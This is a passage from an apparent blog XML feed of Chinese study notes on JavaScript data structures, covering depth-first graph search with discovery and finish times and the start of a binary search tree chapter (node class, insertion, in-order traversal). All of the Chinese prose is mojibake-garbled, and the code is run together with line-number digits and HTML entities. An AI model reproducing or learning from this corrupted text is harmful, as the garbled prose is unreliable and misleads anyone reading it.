æ·±åº¦ä¼˜å…ˆæœç´¢æ·±åº¦ä¼˜å…ˆæœç´¢ç®—æ³•å°†ä¼šä»Žç¬¬ä¸€ä¸ªæŒ‡å®šçš„é¡¶ç‚¹å¼€å§‹éåŽ†å›¾ï¼Œæ²¿ç€è·¯å¾„ç›´åˆ°è¿™æ¡è·¯å¾„æœ€åŽä¸€ä¸ªé¡¶ç‚¹è¢«è®¿é—®äº†ï¼ŒæŽ¥ç€åŽŸè·¯è¿”å›žå¹¶æŽ¢ç´¢ä¸‹ä¸€æ¡è·¯å¾„ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒæ˜¯å…ˆæ·±åº¦åŽå¹¿åº¦åœ°è®¿é—®é¡¶ç‚¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º æ·±åº¦ä¼˜å…ˆæœç´¢ç®—æ³•ä¸éœ€è¦ä¸€ä¸ªæºé¡¶ç‚¹ã€‚åœ¨æ·±åº¦ä¼˜å…ˆæœç´¢ç®—æ³•ä¸­ï¼Œè‹¥å›¾ä¸­é¡¶ç‚¹væœªè¢«è®¿é—®ï¼Œåˆ™è®¿é—®è¯¥é¡¶ç‚¹ã€‚ è¦è®¿é—®é¡¶ç‚¹v,ç…§ä¸‹åˆ—çš„æ­¥éª¤ æ ‡æ³¨vä¸ºè¢«å‘çŽ°çš„ï¼ˆç°è‰²ï¼‰ å¯¹äºŽvçš„æ‰€æœ‰æœªè®¿é—®çš„é‚»ç‚¹wï¼Œè®¿é—®é¡¶ç‚¹wï¼Œæ ‡æ³¨vä¸ºå·²è¢«æŽ¢ç´¢çš„ï¼ˆé»‘è‰²ï¼‰ å®žçŽ° 1234567891011121314151617181920212223// æ·±åº¦ä¼˜å…ˆæŽ¢ç´¢ç®—æ³•this.dfs = function(callback)&#123; var color = this.initializeColor(); for(var i = 0 ; i &lt; vertices.length; i++)&#123; if(color[vertices[i]] === 'white' )&#123; this.dfsVisit(vertices[i],color,callback); &#125; &#125; &#125;this.dfsVisit =function(u,color,callback)&#123; color[u] = 'grey'; if(callback)&#123; callback(u); &#125; var neighbors = adjList.get(u); for(var i = 0 ;i &lt; neighbors.length; i++)&#123; var w = neighbors[i]; if(color[w] === 'white')&#123; arguments.callee(w,color,callback); &#125; &#125; color[u] = 'black';&#125; é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºäº†é¢œè‰²æ•°ç»„ï¼Œå¹¶ç”¨å€¼white ä¸ºå›¾ä¸­çš„æ¯ä¸ªé¡¶ç‚¹å¯¹å…¶è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œå¹¿åº¦ä¼˜å…ˆæœç´¢ä¹Ÿæ˜¯è¿™ä¹ˆåšçš„ã€‚æŽ¥ç€ï¼Œå¯¹äºŽå›¾å®žä¾‹ä¸­æ¯ä¸€ä¸ªæœªè¢«è®¿é—®è¿‡çš„é¡¶ç‚¹ï¼Œæˆ‘ä»¬è°ƒç”¨é€’å½’å‡½æ•° dfsVisit ï¼Œä¼ é€’çš„å‚æ•°ä¸ºé¡¶ç‚¹ã€é¢œè‰²æ•°ç»„å’Œå›žè°ƒå‡½æ•°ã€‚ å½“è®¿é—®ué¡¶ç‚¹æ—¶ï¼Œæˆ‘ä»¬æ ‡æ³¨å…¶ä¸ºè¢«å‘çŽ°çš„greyã€‚å¦‚æžœæœ‰callback å‡½æ•°çš„è¯ï¼Œåˆ™æ‰§è¡Œè¯¥å‡½æ•°è¾“å‡ºå·²è®¿é—®è¿‡çš„é¡¶ç‚¹ã€‚æŽ¥ä¸‹æ¥ä¸€æ­¥æ˜¯å–å¾—åŒ…å«é¡¶ç‚¹uçš„æ‰€æœ‰é‚»ç‚¹çš„åˆ—è¡¨ã€‚å¯¹äºŽé¡¶ç‚¹uçš„æ¯ä¸€ä¸ªæœªè¢«è®¿é—®è¿‡çš„é‚»ç‚¹wï¼Œæˆ‘ä»¬å°†è°ƒç”¨dfsVisit å‡½æ•°ï¼Œä¼ é€’wå’Œå…¶ä»–å‚æ•°ã€‚æœ€åŽï¼Œåœ¨è¯¥2é¡¶ç‚¹å’Œé‚»ç‚¹æŒ‰æ·±åº¦è®¿é—®ä¹‹åŽï¼Œæˆ‘ä»¬å›žé€€ï¼Œæ„æ€æ˜¯è¯¥é¡¶ç‚¹å·²ç»è¢«å®Œå…¨æŽ¢ç´¢äº†ï¼Œå¹¶å°†å…¶æ ‡æ³¨ä¸ºblack æµ‹è¯• 12345678910graph.dfs(printNode); // è®¿é—®äº†é¡¶ç‚¹ï¼šA// è®¿é—®äº†é¡¶ç‚¹ï¼šB// è®¿é—®äº†é¡¶ç‚¹ï¼šE// è®¿é—®äº†é¡¶ç‚¹ï¼šI// è®¿é—®äº†é¡¶ç‚¹ï¼šF// è®¿é—®äº†é¡¶ç‚¹ï¼šC// è®¿é—®äº†é¡¶ç‚¹ï¼šD// è®¿é—®äº†é¡¶ç‚¹ï¼šG// è®¿é—®äº†é¡¶ç‚¹ï¼šH ä¸‹é¢è¿™ä¸ªç¤ºæ„å›¾å±•ç¤ºäº†è¯¥ç®—æ³•æ¯ä¸€æ­¥çš„æ‰§è¡Œè¿‡ç¨‹ æŽ¢ç´¢æ·±åº¦ä¼˜åŒ–ç®—æ³• æˆ‘ä»¬çŽ°åœ¨åªæ˜¯å±•ç¤ºäº†æ·±åº¦ä¼˜å…ˆæœç´¢ç®—æ³•çš„å·¥ä½œåŽŸç†ã€‚æˆ‘ä»¬å¯ä»¥ç”¨è¯¥ç®—æ³•åšæ›´å¤šçš„äº‹æƒ…ï¼Œè€Œä¸æ˜¯åªè¾“å‡ºè¢«è®¿é—®é¡¶ç‚¹çš„é¡ºåºã€‚ å¯¹äºŽç»™å®šçš„å›¾Gï¼Œæˆ‘ä»¬å¸Œæœ›æ·±åº¦ä¼˜å…ˆæŽ¢ç´¢ç®—æ³•éåŽ†å›¾Gçš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œæž„å»ºâ€œæ·±æž—â€ï¼ˆæœ‰æ ¹æ ‘çš„ä¸€ä¸ªé›†åˆï¼‰å·²ç»ä¸€ç»„æºé¡¶ç‚¹ï¼ˆæ ¹ï¼‰ï¼Œå¹¶è¾“å‡ºä¸¤ä¸ªæ•°ç»„:å‘çŽ°æ—¶é—´å’Œå®ŒæˆæŽ¢ç´¢æ—¶é—´ã€‚æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ dfs æ–¹æ³•æ¥è¿”å›žç»™æˆ‘ä»¬ä¸€äº›ä¿¡æ¯ï¼š é¡¶ç‚¹uçš„å‘çŽ°æ—¶é—´d[u] å½“é¡¶ç‚¹uè¢«æ ‡æ³¨ä¸ºé»‘è‰²æ—¶ï¼Œuçš„å®ŒæˆæŽ¢ç´¢æ—¶é—´f[u] é¡¶ç‚¹uçš„å‰æº¯ç‚¹p[u] 12345678910111213141516171819202122232425262728293031323334353637383940414243// è¿½è¸ªå‘çŽ°äº‹ä»¶å’Œå®ŒæˆæŽ¢ç´¢æ—¶é—´var time = 0;// æ·±åº¦ä¼˜å…ˆæŽ¢ç´¢ç®—æ³•ä¼˜åŒ–ç‰ˆæœ¬this.DFS = function()&#123; var color = this.initializeColor(), d = [], f = [], p = []; time = 0; for(var i = 0; i &lt; vertices.length; i++)&#123; f[vertices[i]] = 0; d[vertices[i]] = 0; p[vertices[i]] = null; &#125; for(i = 0; i&lt; vertices.length; i++)&#123; if(color[vertices[i]] === 'white')&#123; this.DFSVisit(vertices[i],color,d,f,p) &#125; &#125; return &#123; discovery:d, finished:f, predecessors:p &#125;&#125;this.DFSVisit = function(u,color,d,f,p)&#123; console.log('å‘çŽ°äº†'+u); color[u] = 'grey'; d[u] = ++time; var neighbors = adjList.get(u); for(var i = 0; i &lt; neighbors.length; i++)&#123; var w = neighbors[i]; if(color[w] === 'white')&#123; p[w] = u; arguments.callee(w,color,d,f,p); &#125; &#125; color[u] = 'black'; f[u] = ++time; console.log('æŽ¢ç´¢äº†'+u);&#125; é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå˜é‡æ¥è¿½è¸ªå‘çŽ°æ—¶é—´å’Œå®ŒæˆæŽ¢ç´¢æ—¶é—´ã€‚æ—¶é—´å˜é‡ä¸èƒ½è¢«ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œå› ä¸ºéžå¯¹è±¡çš„å˜é‡ä¸èƒ½ä½œä¸ºå¼•ç”¨ä¼ é€’ç»™å…¶ä»–Jsæ–¹æ³•ã€‚æŽ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å£°æ˜Žæ•°ç»„dã€få’Œpã€‚æˆ‘ä»¬éœ€è¦ä¸ºå›¾çš„æ¯ä¸€ä¸ªé¡¶ç‚¹æ¥åˆå§‹åŒ–è¿™äº›æ•°ç»„ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ç»“å°¾è¿”å›žè¿™äº›å€¼ã€‚ å½“ä¸€ä¸ªé¡¶ç‚¹ç¬¬ä¸€æ¬¡è¢«å‘çŽ°æ—¶ï¼Œæˆ‘ä»¬è¦è¿½è¸ªå…¶å‘çŽ°æ—¶é—´ã€‚å½“å®ƒæ˜¯ç”±å¼•è‡ªé¡¶ç‚¹uçš„è¾¹è€Œè¢«å‘çŽ°çš„ã€‚æˆ‘ä»¬è¿½è¸ªå®ƒçš„å‰æº¯ç‚¹ã€‚æœ€åŽï¼Œå½“è¿™ä¸ªé¡¶ç‚¹è¢«å®Œå…¨æŽ¢ç´¢ä¹‹åŽï¼Œæˆ‘ä»¬è¿½è¸ªå…¶å®Œæˆæ—¶é—´ã€‚ æ·±åº¦ä¼˜å…ˆç®—æ³•èƒŒåŽçš„æ€æƒ³æ˜¯ä»€ä¹ˆï¼Ÿ è¾¹æ˜¯ä»Žæœ€è¿‘å‘çŽ°çš„uå¤„è¢«å‘å¤–æŽ¢ç´¢çš„ã€‚åªæœ‰è¿žæŽ¥åˆ°æœªå‘çŽ°çš„é¡¶ç‚¹çš„è¾¹è¢«æŽ¢ç´¢äº†ã€‚å½“uæ‰€æœ‰çš„è¾¹éƒ½è¢«æŽ¢ç´¢äº†ï¼Œè¯¥ç®—æ³•è¿”å›žuè¢«å‘çŽ°çš„åœ°æ–¹åŽ»æŽ¢ç´¢å…¶ä»–çš„è¾¹ã€‚è¿™ä¸ªè¿‡ç¨‹æŒç»­åˆ°æˆ‘ä»¬å‘çŽ°äº†è™½å¶æœ‰ä»ŽåŽŸå§‹é¡¶ç‚¹èƒ½å¤Ÿè§¦åŠçš„é¡¶ç‚¹ã€‚å¦‚æžœè¿˜ç•™æœ‰å…¶ä»–æœªè¢«å‘çŽ°çš„é¡¶ç‚¹ã€‚æˆ‘ä»¬å¯¹æ–°çš„æºé¡¶ç‚¹å°†é‡å¤è¿™ä¸ªè¿‡ç¨‹ã€‚ç›´åˆ°å›¾ä¸­æ‰€æœ‰çš„é¡¶ç‚¹éƒ½è¢«æŽ¢ç´¢äº†ã€‚ æµ‹è¯• 1234567891011121314151617181920212223242526var deepPath = graph.DFS();console.log(deepPath);/**å‘çŽ°äº†Aå‘çŽ°äº†Bå‘çŽ°äº†Eå‘çŽ°äº†IæŽ¢ç´¢äº†IæŽ¢ç´¢äº†Eå‘çŽ°äº†FæŽ¢ç´¢äº†FæŽ¢ç´¢äº†Bå‘çŽ°äº†Cå‘çŽ°äº†Då‘çŽ°äº†GæŽ¢ç´¢äº†Gå‘çŽ°äº†HæŽ¢ç´¢äº†HæŽ¢ç´¢äº†DæŽ¢ç´¢äº†CæŽ¢ç´¢äº†Adiscovery: [A: 1, B: 2, C: 10, D: 11, E: 3, F: 7, G: 12, H: 14, I: 4]finished: [A: 18, B: 9, C: 17, D: 16, E: 6, F: 8, G: 13, H: 15, I: 5]predecessors: [A: null, B: "A", C: "A", D: "C", E: "B", G: "D", H: "D", I: "E"]*/ å°ç»“æœ¬ç« å­¦ä¹ äº†å‡ ç§ä¸åŒçš„æ–¹å¼æ¥è¡¨ç¤ºå›¾è¿™ä¸€æ•°æ®ç»“æž„ã€‚å¹¶å®žçŽ°äº†ç”¨é‚»æŽ¥è¡¨è¡¨ç¤ºå›¾çš„ç®—æ³•ã€‚è¿˜å­¦ä¹ äº†å¹¿åº¦ä¼˜å…ˆæœç´¢å’Œæ·±åº¦ä¼˜å…ˆæœç´¢çš„å®žé™…åº”ç”¨ã€‚ ä¹¦ç±é“¾æŽ¥ï¼š å­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘è¦æ”¾å¼ƒjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ï¼ˆç¬¬å…«ç« ï¼‰â€”â€” æ ‘]]></title>
    <url>%2F2018-11-05-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part8.html</url>
    <content type="text"><![CDATA[ä¹‹å‰ä»‹ç»äº†ä¸€äº›é¡ºåºæ•°æ®ç»“æž„ï¼Œä»‹ç»çš„ç¬¬ä¸€ä¸ªéžé¡ºåºæ•°æ®ç»“æž„æ˜¯æ•£åˆ—è¡¨ã€‚æœ¬ç« æ‰ä¼šå­¦ä¹ å¦ä¸€ç§éžé¡ºåºæ•°æ®ç»“æž„â€”â€”æ ‘ï¼Œå®ƒå¯¹äºŽå­˜å‚¨éœ€è¦å¿«é€Ÿå¯»æ‰¾çš„æ•°æ®éžå¸¸æœ‰ç”¨ã€‚ æœ¬ç« å†…å®¹ æ ‘çš„ç›¸å…³æœ¯è¯­ åˆ›å»ºæ ‘æ•°æ®ç»“æž„ æ ‘çš„éåŽ† æ·»åŠ å’Œç§»é™¤ä¹¦çš„èŠ‚ç‚¹ AVL æ ‘ ç¬¬å…«ç«  æ ‘æ ‘æ•°æ®ç»“æž„æ ‘æ˜¯ä¸€ç§åˆ†å±‚æ•°æ®çš„æŠ½è±¡æ¨¡åž‹ã€‚çŽ°å®žç”Ÿæ´»ä¸­æœ€å¸¸è§çš„æ ‘çš„å…¸åž‹ä¾‹å­å°±æ˜¯å®¶è°±ï¼Œæˆ–æ˜¯å…¬å¸çš„ç»„ç»‡æž¶æž„ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ æ ‘çš„ç›¸å…³æœ¯è¯­ä¸€ä¸ªæ ‘ç»“æž„åŒ…å«ä¸€ç³»åˆ—å­˜åœ¨çˆ¶å­å…³ç³»çš„èŠ‚ç‚¹ã€‚æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªçˆ¶èŠ‚ç‚¹ï¼ˆé™¤äº†é¡¶éƒ¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼‰å·²ç»é›¶ä¸ªæˆ–è€…å¤šä¸ªå­èŠ‚ç‚¹ï¼š ä½äºŽæ ‘é¡¶éƒ¨çš„èŠ‚ç‚¹å«åšæ ¹èŠ‚ç‚¹ï¼ˆ11ï¼‰ã€‚å®ƒæ²¡æœ‰çˆ¶èŠ‚ç‚¹ã€‚æ ‘ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½å«åšèŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹åˆ†æˆå†…éƒ¨èŠ‚ç‚¹å’Œå¤–éƒ¨èŠ‚ç‚¹ã€‚è‡³å°‘æœ‰ä¸€ä¸ªå­èŠ‚ç‚¹çš„èŠ‚ç‚¹ç§°ä¸ºå†…éƒ¨èŠ‚ç‚¹ï¼ˆ7/5/9/12/13/20æ˜¯å†…éƒ¨èŠ‚ç‚¹ï¼‰ã€‚æ²¡æœ‰å­å…ƒç´ çš„èŠ‚ç‚¹è¢«ç§°ä¸ºå¤–éƒ¨èŠ‚ç‚¹æˆ–è€…æ˜¯å¶èŠ‚ç‚¹ï¼ˆ3/6/8/10/12/14/18/25 æ˜¯å¶èŠ‚ç‚¹ï¼‰ã€ ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥æœ‰ç¥–å…ˆå’ŒåŽä»£ï¼Œä¸€ä¸ªèŠ‚ç‚¹ï¼ˆé™¤äº†æ ¹èŠ‚ç‚¹ï¼‰çš„ç¥–å…ˆåŒ…æ‹¬çˆ¶èŠ‚ç‚¹ã€ç¥–çˆ¶èŠ‚ç‚¹ã€å¢žç¥–çˆ¶èŠ‚ç‚¹ç­‰ã€‚ä¸€ä¸ªèŠ‚ç‚¹çš„åŽä»£åŒ…æ‹¬å­èŠ‚ç‚¹ã€å­™å­èŠ‚ç‚¹ã€å¢žå­™å­èŠ‚ç‚¹ç­‰ã€‚ä¾‹å¦‚ï¼ŒèŠ‚ç‚¹5çš„ç¥–å…ˆæœ‰èŠ‚ç‚¹7å’ŒèŠ‚ç‚¹11ï¼ŒåŽä»£æœ‰èŠ‚ç‚¹3å’ŒèŠ‚ç‚¹6. æœ‰å…³æ ‘çš„å¦å¤–ä¸€ä¸ªæœ¯è¯­æ˜¯å­æ ‘ã€‚å­æ ‘ç”±èŠ‚ç‚¹å’Œå®ƒçš„åŽä»£æž„æˆã€‚ä¾‹å¦‚ï¼ŒèŠ‚ç‚¹13/12å’Œ14 æž„æˆäº†ä¸Šå›¾ä¸­çš„æ ‘çš„ä¸€é¢—å­æ ‘ã€‚ èŠ‚ç‚¹çš„ä¸€ä¸ªå±žæ€§æ˜¯æ·±åº¦ï¼ŒèŠ‚ç‚¹çš„æ·±åº¦å–å†³äºŽå®ƒçš„ç¥–å…ˆèŠ‚ç‚¹çš„æ•°é‡ã€‚æ¯”å¦‚ï¼ŒèŠ‚ç‚¹3æœ‰ä¸‰ä¸ªç¥–å…ˆèŠ‚ç‚¹ï¼ˆ5/7/11ï¼‰ï¼Œå®ƒçš„æ·±åº¦ä¸º3 æ ‘çš„é«˜åº¦å–å†³äºŽæ‰€æœ‰èŠ‚ç‚¹çš„æ·±åº¦çš„æœ€å¤§å€¼ã€‚ä¸€é¢—æ ‘ä¹Ÿå¯ä»¥è¢«åˆ†è§£æˆå±‚çº§ã€‚æ ¹èŠ‚ç‚¹åœ¨ç¬¬0å±‚ï¼Œå®ƒçš„å­èŠ‚ç‚¹åœ¨ç¬¬1å±‚ï¼Œä»¥æ­¤ç±»æŽ¨ã€‚ä¸Šå›¾ä¸­çš„æ ‘çš„é«˜åº¦ä¸º3 äºŒå‰æ ‘å’ŒäºŒå‰æœç´¢æ ‘äºŒå‰æ ‘çš„èŠ‚ç‚¹æœ€å¤šåªèƒ½æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼šä¸€ä¸ªæ˜¯å·¦ä¾§å­èŠ‚ç‚¹ï¼Œå¦å¤–ä¸€ä¸ªå³ä¾§å­èŠ‚ç‚¹ã€‚è¿™äº›å®šä¹‰æœ‰åŠ©äºŽæˆ‘ä»¬å†™å‡ºæ›´é«˜æ•ˆçš„ä»Žæ ‘ä¸­æ’å…¥ã€æŸ¥æ‰¾å’Œåˆ é™¤èŠ‚ç‚¹çš„ç®—æ³•ã€‚äºŒå‰æ ‘åœ¨è®¡ç®—æœºç§‘å­¦ä¸­çš„åº”ç”¨éžå¸¸å¹¿æ³›ã€‚ äºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰æ˜¯äºŒå‰æ ‘çš„ä¸€ç§ï¼Œä½†æ˜¯å®ƒåªå…è®¸ä½ åœ¨å·¦ä¾§èŠ‚ç‚¹å­˜å‚¨ï¼ˆæ¯”çˆ¶èŠ‚ç‚¹ï¼‰å°çš„å€¼ï¼Œåœ¨å³ä¾§èŠ‚ç‚¹å­˜å‚¨ï¼ˆæ¯”çˆ¶èŠ‚ç‚¹ï¼‰å¤§ï¼ˆæˆ–è€…ç­‰äºŽï¼‰çš„å€¼ã€‚ äºŒå‰æœç´¢æ ‘å°†æ˜¯æˆ‘ä»¬åœ¨æœ¬ç« è¦ç ”ç©¶çš„æ•°æ®ç»“æž„ã€‚ åˆ›å»ºBinarySearchTree ç±»é¦–å…ˆï¼Œå£°æ˜Žå®ƒçš„ç»“æž„ï¼š 12345678function BinarySearchTree()&#123; var Node = function(key)&#123; this.key = key; this.left = null; this.right = null; &#125; var root = null;&#125; ä¸‹é¢å±•çŽ°äº†äºŒå‰æœç´¢æ ‘ç»“æž„çš„ç»„ç»‡æ–¹å¼ï¼š å’Œé“¾è¡¨ä¸€æ ·ï¼Œå°†é€šè¿‡æŒ‡é’ˆæ¥è¡¨ç¤ºèŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»ï¼ˆæœ¯è¯­ç§°å…¶ä¸ºè¾¹ï¼‰ã€‚åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹åŒ…å«ä¸¤ä¸ªæŒ‡é’ˆï¼Œä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸€ä¸ªæŒ‡å‘ä¸Šä¸€ä¸ªèŠ‚ç‚¹ã€‚å¯¹äºŽæ ‘ï¼Œä½¿ç”¨åŒæ ·çš„æ–¹å¼ï¼ˆä¹Ÿæ˜¯ä½¿ç”¨ä¸¤ä¸ªæŒ‡é’ˆï¼‰ã€‚ä½†æ˜¯ï¼Œä¸€ä¸ªæŒ‡å‘å·¦ä¾§å­èŠ‚ç‚¹ï¼Œå¦ä¸€ä¸ªæŒ‡å‘å³ä¾§å­èŠ‚ç‚¹ã€‚å› æ­¤ï¼Œå°†å£°æ˜Žä¸€ä¸ª Node ç±»æ¥è¡¨ç¤ºçš„ä¹¦çš„æ¯ä¸ªèŠ‚ç‚¹ã€‚ä¸åŒäºŽå‰é¢çš„ç« èŠ‚ï¼Œæˆ‘ä»¬ä¼šå°†èŠ‚ç‚¹æœ¬èº«ç§°ä¸ºé”®è€Œä¸æ˜¯èŠ‚ç‚¹æˆ–è€…æ˜¯é¡¹ã€‚é”®æ˜¯æ ‘ç›¸å…³çš„æœ¯è¯­ç§å¯¹èŠ‚ç‚¹çš„ç§°å‘¼ã€‚ æˆ‘ä»¬å°†ä¼šéµå¾ªç¬¬äº”ç«  LinkedList ç±»ç›¸åŒçš„æ¨¡å¼ï¼Œè¿™è¡¨ç¤ºä¹Ÿå°†å£°æ˜Žä¸€ä¸ªå˜é‡ä»¥æŽ§åˆ¶æ­¤æ•°æ®ç»“æž„çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚åœ¨æ ‘ä¸­ï¼Œå®ƒä¸å†æ˜¯å¤´èŠ‚ç‚¹ï¼Œè€Œæ˜¯æ ¹å…ƒç´ ã€‚ ä¸‹é¢æ˜¯å°†è¦åœ¨æ ‘ç±»ä¸­å®žçŽ°çš„æ–¹æ³• insertï¼ˆkeyï¼‰ï¼šå‘æ ‘ä¸­æ’å…¥ä¸€ä¸ªæ–°çš„é”® searchï¼ˆkeyï¼‰ï¼šåœ¨æ ‘ä¸­æŸ¥æ‰¾ä¸€ä¸ªé”®ï¼Œå¦‚æžœèŠ‚ç‚¹å­˜åœ¨ï¼Œåˆ™è¿”å›ž true,å¦åˆ™è¿”å›ž false inOrderTraverseï¼šé€šè¿‡ä¸­åºéåŽ†æ–¹å¼éåŽ†æ‰€æœ‰èŠ‚ç‚¹ preOrderTraverseï¼šé€šè¿‡å…ˆåºéåŽ†æ–¹å¼éåŽ†æ‰€æœ‰èŠ‚ç‚¹ postOrderTraverseï¼šé€šè¿‡åŽåºéåŽ†æ–¹å¼éåŽ†æ‰€æœ‰èŠ‚ç‚¹ minï¼šè¿”å›žæ ‘ä¸­æœ€å°çš„å€¼/é”® maxï¼šè¿”å›žæ ‘ä¸­æœ€å¤§çš„å€¼/é”® removeï¼ˆkeyï¼‰ï¼šä»Žæ ‘ä¸­ç§»é™¤æŸä¸ªé”® å‘æ ‘ä¸­æ’å…¥ä¸€ä¸ªé”®æœ¬ç« è¦å®žçŽ°çš„æ–¹æ³•ä¼šæ¯”ä¹‹å‰çš„è¦å¤æ‚å¾ˆå¤šï¼Œè¦ç”¨åˆ°é€’å½’ã€‚ 12345678this.insert = function(key)&#123; var newNode = new Node(key); if(root === null)&#123; root = newNode; &#125;else&#123; insertNode(root,newNode) &#125;&#125; è¦å‘æ ‘ä¸­æ’å…¥ä¸€ä¸ªæ–°çš„èŠ‚ç‚¹ï¼Œè¦ç»åŽ†ä¸‰ä¸ªæ­¥éª¤ æ˜¯åˆ›å»ºç”¨æ¥è¡¨ç¤ºæ–°èŠ‚ç‚¹çš„Node ç±»å®žä¾‹ï¼Œåªéœ€è¦å‘æž„é€ å‡½æ•°ä¼ é€’æˆ‘ä»¬æƒ³ç”¨æ¥æ’å…¥æ ‘çš„èŠ‚ç‚¹å€¼ï¼Œå®ƒçš„å·¦æŒ‡é’ˆå’Œå³æŒ‡é’ˆä¼šç”±æž„é€ å‡½æ•°ä¸Žè‡ªåŠ¨è®¾ç½®ä¸º null éªŒè¯è¿™ä¸ªæ’å…¥æ“ä½œæ˜¯å¦ä¸ºä¸€ç§ç‰¹æ®Šæƒ…å†µã€‚è¿™ä¸ªç‰¹æ®Šæƒ…å†µå°±æ˜¯æˆ‘ä»¬è¦æ’å…¥çš„èŠ‚ç‚¹æ˜¯æ ‘çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚å¦‚æžœæ˜¯ï¼Œå°±å°†èŠ‚ç‚¹æŒ‡å‘æ–°èŠ‚ç‚¹ã€‚ å¦‚æžœä¸æ˜¯ï¼Œå°±è¦å°†èŠ‚ç‚¹åŠ åœ¨éžæ ¹èŠ‚ç‚¹çš„å…¶ä»–ä½ç½®ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦ä¸€ä¸ªç§æœ‰çš„è¾…åŠ©å‡½æ•° 123456789101112131415var insertNode = function(node,newNode)&#123; if(newNode.key &lt; node.key)&#123; if(node.left === null)&#123; node.left = newNode; &#125;else&#123; insertNode(node.left,newNode) &#125; &#125;else&#123; if(node.right === null)&#123; node.right = newNode; &#125;else&#123; insertNode(node.right,newNode) &#125; &#125;&#125; insertNode å‡½æ•°ä¼šå¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°æ–°èŠ‚ç‚¹åº”è¯¥æ’å…¥çš„æ­£ç¡®ä½ç½®ï¼Œä¸‹é¢æ˜¯è¿™ä¸ªå‡½æ•°å®žçŽ°çš„æ­¥éª¤ã€‚ å¦‚æžœæ ‘éžç©ºï¼Œéœ€è¦æ‰¾åˆ°æ’å…¥æ–°èŠ‚ç‚¹çš„ä½ç½®ï¼Œå› æ­¤åœ¨è°ƒç”¨ insertNode æ–¹æ³•æ—¶è¦é€šè¿‡å‚æ•°ä¼ å…¥æ ¹ä¹¦çš„æ ¹èŠ‚ç‚¹å’Œè¦æ’å…¥çš„èŠ‚ç‚¹ã€‚ å¦‚æžœæ–°èŠ‚ç‚¹çš„é”®å°äºŽå½“å‰èŠ‚ç‚¹çš„é”®ï¼ˆå½“å‰èŠ‚ç‚¹å°±æ˜¯æ ¹èŠ‚ç‚¹ï¼‰ï¼Œé‚£ä¹ˆéœ€è¦æ£€æŸ¥å½“å‰èŠ‚ç‚¹çš„å·¦ä¾§èŠ‚ç‚¹ï¼Œéœ€è¦é€šè¿‡é€’å½’è°ƒç”¨ insertNode æ–¹æ³•ç»§ç»­éœ€è¦æ ‘çš„ä¸‹ä¸€å±‚ï¼Œåœ¨è¿™é‡Œï¼Œä¸‹æ¬¡å°†è¦æ¯”è¾ƒçš„èŠ‚ç‚¹å°±ä¼šæ˜¯å½“å‰èŠ‚ç‚¹çš„å·¦ä¾§èŠ‚ç‚¹ã€‚ å¦‚æžœèŠ‚ç‚¹çš„é”®å¤§äºŽå½“å‰èŠ‚ç‚¹çš„é”®ï¼ŒåŒæ—¶å½“å‰èŠ‚ç‚¹æ²¡æœ‰å³ä¾§å­èŠ‚ç‚¹ï¼Œå°±åœ¨é‚£é‡Œæ’å…¥æ´—çš„èŠ‚ç‚¹ã€‚å¦‚æžœæœ‰å³ä¾§å­èŠ‚ç‚¹ï¼ŒåŒæ ·éœ€è¦é€’å½’è°ƒç”¨ insertNode æ–¹æ³•ï¼Œä½†æ˜¯è¦ç”¨æ¥å’Œæ–°èŠ‚ç‚¹æ¯”è¾ƒçš„èŠ‚ç‚¹å°†ä¼šæ˜¯å³ä¾§å­èŠ‚ç‚¹ã€‚ æ ‘çš„éåŽ†éåŽ†ä¸€é¢—æ ‘æ˜¯æŒ‡è®¿é—®æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹å¹¶å¯¹å®ƒä»¬è¿›è¡ŒæŸç§æ“ä½œçš„è¿‡ç¨‹ã€‚è®¿é—®æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹æœ‰ä¸‰ç§æ–¹æ³•ï¼šä¸­åºã€å…ˆåºå’ŒåŽåºã€‚ ä¸­åºéåŽ†ä¸­åºéåŽ†æ˜¯ä¸€ç§ä»¥ä¸Šè¡Œé¡ºåºè®¿é—®BST æ‰€æœ‰èŠ‚ç‚¹çš„éåŽ†æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯ä»¥æœ€å°å’Œæœ€å¤§çš„é¡ºåºè®¿é—®æ‰€æœ‰èŠ‚ç‚¹ã€‚ä¸­åºéåŽ†çš„ä¸€ç§åº”ç”¨å°±æ˜¯å¯¹æ•°è¿›è¡ŒæŽ’åºæ“ä½œã€‚å®žçŽ°ï¼š 123this.inOrderTraverse = function(callback)&#123; inOrderTraverseNode(root,callback);&#125; inOrderTraverse 